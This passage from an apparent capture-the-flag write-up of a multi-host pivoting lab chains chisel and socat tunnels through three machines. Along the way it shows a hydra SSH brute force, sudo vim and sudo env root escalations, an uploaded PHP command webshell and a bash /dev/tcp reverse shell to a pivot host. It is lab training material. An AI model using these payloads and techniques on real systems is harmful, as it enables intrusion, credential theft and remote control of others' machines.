And also we need to add to the final of the **proxychains config file** this:

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/Trust]
└─$ tail -n 2 /etc/proxychains4.conf 
socks5 127.0.0.1 1111
socks5 127.0.0.1 1080
```

For each access we gain, we sort it by each new connection we receive.

---
# Reconnaissance Trust

So let's make a scan to see what ports are open in **Trust.**

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/Trust]
└─$ sudo proxychains -q nmap --top-ports 1000 -sT -Pn -n --min-rate 5000 30.30.30.3 -vv 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 12:18 -05
Initiating Connect Scan at 12:18
Scanning 30.30.30.3 [1000 ports]
Discovered open port 22/tcp on 30.30.30.3
Discovered open port 80/tcp on 30.30.30.3
Completed Connect Scan at 12:19, 44.61s elapsed (1000 total ports)
Nmap scan report for 30.30.30.3
Host is up, received user-set (0.044s latency).
Scanned at 2025-12-16 12:18:35 -05 for 45s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 44.76 seconds
```

So we are going to make another nmap scan by these 2 ports, to discover what services and versions are running.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/Trust]
└─$ sudo proxychains -q nmap -p22,80 -sT -Pn -n -sCV 30.30.30.3 -oX target --stats-every=1m
```

Then let's convert this XML file to HMTL.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/Trust]
└─$ xsltproc target -o target.html
```

And let's open it.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/Trust]
└─$ open target.html
```

![Screenshot](/hard/BigPivoting/Images/image11.png)

Okay so we can see another website here, let's make another proxy with **foxyproxy** to be able to view the page.

![Screenshot](/hard/BigPivoting/Images/image12.png)

Once we configure it successfully let's activate the proxy and visit the website.

![Screenshot](/hard/BigPivoting/Images/image13.png)

And we can view the page!

But if we try to enumerate contents of the website with **ffuf** or **gobuster**, once again are going to be very slow with **proxychains**.

---
# Exploitation Trust

So we need to make our own enumeration tool once again with python.

```python
from pwn import *
import requests
import sys
import signal

dictionary = "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt"

def send_request(payload):
        target = f"http://30.30.30.3/{payload}"

        response = requests.get(url=target)

        if response.status_code != 404:
                log.info(f'"{payload}" exists on the website.')


with log.progress("Getting content...") as bar:
        try:
                with open(dictionary) as file:
                        for line in file:

                                if "#" in line or not line: continue
                                convert = str(line).strip()

                                php = convert + ".php"
                                html = convert + ".html"

                                send_request(php)
                                bar.status(f"Trying with {php}...")
                                send_request(html)
                                bar.status(f"Trying with {html}...")
                                send_request(convert)
                                bar.status(f"Trying with {convert}...")

        except KeyboardInterrupt:
                log.warn("QUITTING...")
                bar.success("Finished.")
                sys.exit(0)
```

With this script we are going to enumerate possible **html** or **php** files, and if we receive a status code different of 404 (not found) the script are going to print that the file or directory exists.

# Enumeration Trust

So let's execute it now.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/Trust]
└─$ sudo proxychains -q python3 enumeration.py
[+] Getting content...: Finished.
[*] ".php" exists on the website.
[*] ".html" exists on the website.
[*] "" exists on the website.
[*] "index.html" exists on the website.
[*] "secret.php" exists on the website.
^C[!] QUITTING..
```

And we got **"secret.php"** let's take a look in our browser.

![Screenshot](/hard/BigPivoting/Images/image14.png)

This is what we found, it seems that exists a user **mario**. After a looong time of enumeration I can only try to brute force with **hydra** on **ssh**.

Then i'm going to try if it works...

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/Trust]
└─$ sudo proxychains -q hydra -t 16 -l mario -P /usr/share/wordlists/rockyou.txt ssh://30.30.30.3
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-16 13:26:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://30.30.30.3:22/
[22][ssh] host: 30.30.30.3   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-16 13:26:39
```

And we got the password of **mario**!

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/Trust]
└─$ sudo proxychains -q ssh mario@30.30.30.3
The authenticity of host '30.30.30.3 (30.30.30.3)' can't be established.
ED25519 key fingerprint is: SHA256:z6uc1wEgwh6GGiDrEIM8ABQT1LGC4CfYAYnV4GXRUVE
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '30.30.30.3' (ED25519) to the list of known hosts.
mario@30.30.30.3's password: 
Linux 2fdace02ac59 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
mario@2fdace02ac59:~$
```

---
# Privilege Escalation Trust

When we execute **sudo -l** we have a privilege of **SUDOER**.

```
mario@2fdace02ac59:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 2fdace02ac59:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 2fdace02ac59:
    (ALL) /usr/bin/vim
```

We can execute **vim** as any user even root.

So let's execute the following commands:

```
mario@2fdace02ac59:~$ sudo vim
```

And the next one:

```
:!/bin/bash
```

and then we gain a shell as the user root.

```
mario@2fdace02ac59:~$ sudo vim
[sudo] password for mario: 

root@2fdace02ac59:/home/mario# whoami
root
```

**Pwned**!

---
# Making tunnel from Trust to Upload

So let's see the network interfaces we have on the system.

```
root@2fdace02ac59:~# hostname -i
30.30.30.3 40.40.40.2
```

As we can see we need to know what is the other machine's IP address, we can do this once again with our mini scanner tool that we made before.

```
root@2fdace02ac59:~# bash scan.sh 
[+] The host 40.40.40.2 is ACTIVE
[+] The host 40.40.40.3 is ACTIVE
```

We found the machine, now let's try to search his ports open.

```
root@2fdace02ac59:~# bash scan.sh 
[+] The port 80 is OPEN
```

Only http, let's make another tunnel with **chisel** and **socat** as I explained before.

So we need to transfer **socat** to the machine **Move**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/Trust]
└─$ sudo proxychains -q scp socat freddy@20.20.20.3:/tmp
freddy@20.20.20.3's password: 
socat
```

Then let's be in listen mode with **socat** to redirect any traffic that receive this machine to the machine **Inclusion**

```
┌──(root㉿93327e482a4b)-[/tmp]
└─# ./socat TCP-LISTEN:2222,fork tcp:20.20.20.2:1111 &
```

And then let's transfer **chisel** to the machine **Trust**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/Trust]
└─$ sudo proxychains -q scp /usr/bin/chisel mario@30.30.30.3:/tmp
mario@30.30.30.3's password: 
chisel
```

So let's try to connect **chisel** from **Trust** to **Move**.

```
root@2fdace02ac59:~# ./chisel client 30.30.30.2:2222 R:2222:socks &
root@2fdace02ac59:~# 2025/12/16 19:18:29 client: Connecting to ws://30.30.30.2:2222
2025/12/16 19:18:29 client: Connected (Latency 1.719686ms)
```

And we receive this in our chisel server:

```
2025/12/16 14:18:29 server: session#3: tun: proxy#R:127.0.0.1:2222=>socks: Listening
```

So we successfully make the tunnel!

But not forget about add the connection to the config file of proxychains.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/bigpivoting/enumeration]
└─$ tail -n 3 /etc/proxychains4.conf 
socks5 127.0.0.1 2222
socks5 127.0.0.1 1111
socks5 127.0.0.1 1080
```

---
# Reconnaissance Upload

Let's make a nmap scan now.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/Upload]
└─$ sudo proxychains -q nmap --top-ports 1000 -sT -Pn -n --min-rate 5000 -vv 40.40.40.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 14:26 -05
Initiating Connect Scan at 14:26
Scanning 40.40.40.3 [1000 ports]
Discovered open port 80/tcp on 40.40.40.3
Completed Connect Scan at 14:27, 48.13s elapsed (1000 total ports)
Nmap scan report for 40.40.40.3
Host is up, received user-set (0.048s latency).
Scanned at 2025-12-16 14:26:48 -05 for 48s
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 48.28 seconds
```

Only the port 80, let's make another nmap scan to know services and versions.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/Upload]
└─$ sudo proxychains -q nmap -p80 -sT -Pn -n -sCV 40.40.40.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 14:29 -05
Nmap scan report for 40.40.40.3
Host is up (0.096s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds
```

In this case i'm not going to use html to see the results, we can see that we can upload a file here.

Let's once again add another proxy to foxyproxy.

![Screenshot](/hard/BigPivoting/Images/image15.png)

Let's use it and take a view of the website.

![Screenshot](/hard/BigPivoting/Images/image16.png)

It seems we can upload anything, so im going to upload a php file, that we can execute commands on the system.

```php
<?php
system($_GET["cmd"]);
?>
```

So I'm going to upload this.

![Screenshot](/hard/BigPivoting/Images/image17.png)

---
# Enumeration Upload

But we don't know the directory that save the files, so i'm going to use once again my enumeration tool.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/Upload]
└─$ sudo proxychains -q python3 enumeration.py 
[+] Getting content...: Finished.
[*] ".php" exists on the website.
[*] ".html" exists on the website.
[*] "/" exists on the website.
[*] "index.html" exists on the website.
[*] "icons/" exists on the website.
[*] "uploads/" exists on the website.
[*] "upload.php" exists on the website.
```

And we find the directory **uploads** probably it contains our file.

![Screenshot](/hard/BigPivoting/Images/image18.png)

---
# Explotation Upload

And we can confirm that, so let's inject our payload.

![Screenshot](/hard/BigPivoting/Images/image19.png)

And we got a RCE, I want to make a reverse shell but I need to redirect all the traffic to our machine, so we need use again **chisel** from the machine **Trust** because we are going to make a reverse shell that goes from **Trust** to the tunnel that we make with the other machines and finally reaching to us.

So once again let's use **chisel** in the machine **Trust**.

```
root@dba4ee2b9f1f:~# ./chisel client 30.30.30.2:2222 3333:192.168.0.20:3131 &
```

With this command we are making that any traffic that enters in the port 3333 from the machine **Trust** are going to be redirected to us on the port 3131.

Then in our attack machine let's be in listen mode with **netcat**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/bigpivoting]
└─$ nc -lvnp 3131
listening on [any] 3131 ..
```

**-l**  <- This argument makes to netcat to be in listening mode.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Okay then let's make a reverse shell to the machine **Upload** to the machine **Trust** and finally in our machine gaining the shell.

So then let's execute the following command on the machine **Upload**:

- **bash -c 'bash -i >%26 /dev/tcp/40.40.40.2/3333 0>%261'**

In summary with this command we are making a interactive shell with the **Trust** machine if we remember all the traffic that receives the machine **Trust** are finally reaching to us.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/bigpivoting]
└─$ nc -lvnp 3131
listening on [any] 3131 ...
connect to [192.168.0.20] from (UNKNOWN) [192.168.0.20] 45822
bash: cannot set terminal process group (25): Inappropriate ioctl for device
bash: no job control in this shell
www-data@64d173908366:/var/www/html/uploads$
```

And we successfully gain access from the machine **Upload**!

### Modifying shell

But we need to change this shell to work appropriately with it.

First of all we do this:

```
www-data@64d173908366:/var/www/html/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

This command makes a new bash session with **script** and **/dev/null** asthe output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of the bash.

When we execute this, we suspend our reverse shell for a moment.

then we execute the next command in our attack machine:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/bigpivoting]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```
www-data@64d173908366:/var/www/html/uploads$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```
www-data@64d173908366:/var/www/html/uploads$ stty rows {num} columns {num}
```

and finally it looks way better!

---
# Privilege Escalation Upload

When executing **sudo -l** we have a privilege of **SUDOER**

```
www-data@64d173908366:/$ sudo -l
Matching Defaults entries for www-data on 64d173908366:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on 64d173908366:
    (root) NOPASSWD: /usr/bin/env
```

We can see that the user **root** can execute the command **env**, basically this command can execute another commands in a controlled enviroment.

So we can execute the following command to gain a shell as the user **root**:

```
www-data@64d173908366:/$ sudo env bash
root@64d173908366:/# whoami
root
```

And finally we are root on the machine **Upload** ***...pwned..!***

---
# Making tunnel from Upload to WhereIsMywebshell

We can check the Interfaces of network that have the machine **Upload**.

```
root@64d173908366:~# hostname -i
40.40.40.3 50.50.50.2
```

We can use our mini scanner to search what it's the address of the other machine.

```
root@64d173908366:~# bash scan.sh 
[+] The host 50.50.50.2 is ACTIVE
[+] The host 50.50.50.3 is ACTIVE
```

So we found the address of the other machine, let's find out once again what ports are open with our mini scanner.

```
root@64d173908366:~# bash scan.sh 
[+] The port 22 is OPEN
[+] The port 80 is OPEN
```

We can find that are 2 ports open.

But also we need chisel on the machine Upload to make the tunnel from the other machine and gain access.

But we have a issue, that we can't directly transfer chisel from our attack machine to the machine Upload.

So we need the machine **Trust** to transfer **chisel**.

Then with the first machine **Trust** let's make a python server to make the machine **Upload** get the tools with **wget**.

```
root@dba4ee2b9f1f:~# python3 -m http.server 100 
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ...
```

And with the Upload machine let's download chisel with wget.

```
root@64d173908366:~# wget http://40.40.40.2:100/chisel
--2025-12-22 05:40:27--  http://40.40.40.2:100/chisel
Connecting to 40.40.40.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10240184 (9.8M) [application/octet-stream]
Saving to: 'chisel'

chisel                                                      100%[========================================================================================================================================>]   9.77M  --.-KB/s    in 0.07s   

2025-12-22 05:40:27 (133 MB/s) - 'chisel' saved [10240184/10240184]
```

Okay so with the machine **Trust** we need to use **socat** to receive the traffic from **chisel**.

```
root@dba4ee2b9f1f:~# ./socat TCP-LISTEN:4444,fork tcp:30.30.30.2:2222 &
```

And finally let's use chisel from **Upload** to make the tunnel.

```
root@64d173908366:~# ./chisel client 40.40.40.2:4444 R:4444:socks &
```

And in our **chisel** server we receive this:

```
2025/12/21 23:45:55 server: session#6: tun: proxy#R:127.0.0.1:4444=>socks: Listening
```

Okay so let's change once again our proxy conf file.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/bigpivoting]
└─$ tail -n4 /etc/proxychains4.conf 
socks5 127.0.0.1 4444
socks5 127.0.0.1 2222
socks5 127.0.0.1 1111
socks5 127.0.0.1 1080
```

Okay so we gain fully access from the machine **WhereIsMywebshell**!

---
# Reconnaissance WhereIsMywebshell

Let's use **nmap** as always.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/WhereIsMywebshell]
└─$ sudo proxychains -q nmap --top-ports 1000 -sT -Pn -n 50.50.50.3 --min-rate 5000 -vv
[sudo] password for craft: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-22 00:06 -05
Initiating Connect Scan at 00:06
Scanning 50.50.50.3 [1000 ports]
Discovered open port 22/tcp on 50.50.50.3
Discovered open port 80/tcp on 50.50.50.3
Completed Connect Scan at 00:07, 49.13s elapsed (1000 total ports)
Nmap scan report for 50.50.50.3
Host is up, received user-set (0.049s latency).
Scanned at 2025-12-22 00:06:48 -05 for 49s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 49.31 seconds
```

2 ports open so let's scan what services and versions are running.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/WhereIsMywebshell]
└─$ sudo proxychains -q nmap -sT -Pn -n -p22,80 -sCV 50.50.50.3 -oX target
```

Okay then let's change the format to html.

![Screenshot](/hard/BigPivoting/Images/image20.png)

It seems that we have a website, so let's take a look with the browser.

But remember that we need to add a proxy on **proxychains** to view the website.

![Screenshot](/hard/BigPivoting/Images/image21.png)

So we save them and let's take a view at it.

![Screenshot](/hard/BigPivoting/Images/image22.png)

And we can see this, but we need to enumerate more about this website, so we need to use our python script, remember that **gobuster** and **ffuf** doesn't work quite well with proxychains.

---
# Enumeration WhereIsMywebshell

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/WhereIsMywebshell]
└─$ sudo proxychains -q python3 enumeration.py
[◑] Enumerating content...: Trying with ew...
[!] ".php" exists on the website.
[!] ".html" exists on the website.
[!] "" exists on the website.
[!] "index.html" exists on the website.
[!] "shell.php" exists on the website.
[!] "warning.html" exists on the website.
```

So we get something interesting, **shell.php** and **warning.html**

Let's take a look first with **warning.html**

![Screenshot](/hard/BigPivoting/Images/image23.png)

---
# Exploitation WhereIsMywebshell

It seems that shell.php needs a parameter, to execute commands, so we need to modify a little bit our enumeration script.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/WhereIsMywebshell]
└─$ sudo proxychains -q python3 enumeration.py
[+] Enumerating parameters...: PWNED!
[!] "parameter" was found!
[!] QUITTING
```

It seems that we found it!

![Screenshot](/hard/BigPivoting/Images/image24.png)

We got success!

So we need to once again make a chisel tunnel to receive a reverse shell.

Then we execute the next command to receive a traffic from the port 5555  in the machine **Upload** to our machine in the port 5151

```
root@5eeb598076b6:~# ./chisel client 40.40.40.2:4444 5555:192.168.0.20:5151 &
```

So let's use once again our payload to gain access.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/WhereIsMywebshell]
└─$ nc -lvnp 5151
listening on [any] 5151 ...
connect to [192.168.0.20] from (UNKNOWN) [192.168.0.20] 40268
bash: cannot set terminal process group (23): Inappropriate ioctl for device
bash: no job control in this shell
www-data@6ceae57cb312:/var/www/html$
```

We are in!

Then we need to modify this shell to work with it properly, you can do the same process that we did before like [here](#modifying-shell)

---
# Privilege Escalation WhereIsMywebshell

There is a part where the website tell us that something is hidden in the **/tmp/** directory.

```
www-data@6ceae57cb312:/$ ls -la tmp
total 12
drwxrwxrwt 1 root root 4096 Dec 22 18:01 .
drwxr-xr-x 1 root root 4096 Dec 22 18:01 ..
-rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt
```

We can see a file here then let's take a look.

```
www-data@6ceae57cb312:/$ cat /tmp/.secret.txt 
contraseñaderoot123
```

It's the password of **root**!

```
www-data@6ceae57cb312:/$ su
Password: 
root@6ceae57cb312:/# whoami
root
```

and finally we a root in all the machines!

- Inclusion -> **PWNED**
- Move -> **PWNED**
- Trust -> **PWNED**
- Upload -> **PWNED**
- WhereIsMywebshell -> **PWNED**

